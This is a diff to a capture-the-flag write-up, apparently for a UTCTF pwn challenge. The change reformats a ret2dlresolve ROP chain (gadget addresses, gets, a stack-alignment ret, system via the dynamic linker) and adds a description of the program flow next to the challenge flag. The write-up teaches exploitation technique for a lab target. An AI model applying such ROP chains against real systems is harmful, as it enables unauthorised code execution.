@@ -53,13 +53,22 @@ p.interactive()
 The rop chain looks something like this:
 
 ```
-0x0000:         0x4011c3 pop rdi; ret                                                                                   0x0008:         0x404e00 [arg0] rdi = 4214272                                                                           0x0010:         0x401044 gets                                                                                           0x0018:         0x401159                                                                                                0x0020:         0x4011c3 pop rdi; ret                                                                                   0x0028:         0x404e50 [arg0] rdi = 4214352                                                                           0x0030:         0x401020 [plt_init] system                                                                              0x0038:            0x310 [dlresolve index]
+0x0000:         0x4011c3 pop rdi; ret                                                                                   
+0x0008:         0x404e00 [arg0] rdi = 4214272                                                                           
+0x0010:         0x401044 gets(arg0)                                                                                           
+0x0018:         0x401159 ret; #for stack alignment                                                                   
+0x0020:         0x4011c3 pop rdi; ret                                                                                   
+0x0028:         0x404e50 [arg0] rdi = 4214352                                                                           
+0x0030:         0x401020 [plt_init] system                                                                             
+0x0038:         0x310 [dlresolve index]
 ```
 
-So just aim this at the server and ye shall receive the flag.  
-`utflag{2_linker_problems_in_one_ctf?8079235}`  
+Our overall program flow will look like `main()->pop rdi->gets()->pop rdi->system()->_dl_runtime_resolve()->system()`. The `pop rdi`'s are to setup arguments to functions later in the chain.
 
-It's pretty cool that we can still call libc functions without the use of address leaks. This exploit will definitely be something that I keep in mind for the future. Although it was really simple for this challenge due to no PIE which probably simplified where we could put the dlpayload.
+So just aim this at the server and ye shall receive the flag.  
+`utflag{2_linker_problems_in_one_ctf?8079235}`
+
+It's pretty cool that we can still call libc functions without the use of address leaks. This exploit will definitely be something that I keep in mind for the future. Although it was really simple for this challenge due to no PIE which probably simplified where we could put the dlpayload. Also pwntools is an awesome tool and thank god it exists.
 
 
 
